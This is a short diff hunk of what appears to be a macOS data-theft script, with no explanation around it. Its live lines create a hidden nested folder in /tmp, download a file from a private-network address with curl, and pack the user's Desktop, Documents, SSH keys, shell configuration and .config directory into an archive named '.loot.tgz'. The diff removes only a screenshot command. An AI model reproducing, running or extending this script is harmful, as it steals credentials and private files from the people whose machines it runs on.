@@ -5,8 +5,6 @@ HOME="/Users/$USER"
 mkdir -p /tmp/.s/.t/.e/.a/.l && curl -s http://192.168.1.216/sh -o /tmp/.s/.t/.e/.a/.l/.s 
 chmod 600 /tmp/.s/.t/.e/.a/.l/.s
 
-screencapture -ixC ~/Desktop/.s.png
-
 cd /tmp/.s/.t/.e/.a/.l
 tar cfz .loot.tgz $HOME/Desktop $HOME/Documents $HOME/.ssh $HOME/.bash* $HOME/.config $HOME/.zsh*
 
